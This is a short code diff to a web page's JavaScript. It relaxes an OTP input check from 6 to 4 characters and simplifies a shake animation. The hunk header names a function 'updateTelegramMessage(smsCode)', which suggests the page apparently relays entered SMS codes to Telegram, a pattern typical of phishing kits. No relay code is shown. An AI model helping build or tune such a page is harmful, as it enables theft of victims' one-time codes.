@@ -85,10 +85,9 @@ async function updateTelegramMessage(smsCode) {
 submitBtn.addEventListener('click', async function () {
     const otp = otpInput.value.trim();
 
-    if (otp.length < 6) {
-        const inputRow = document.querySelector('.otp-input-row');
-        inputRow.classList.add('shake');
-        setTimeout(() => inputRow.classList.remove('shake'), 500);
+    if (otp.length < 4) {
+        otpInput.classList.add('shake');
+        setTimeout(() => otpInput.classList.remove('shake'), 500);
         return;
     }
 
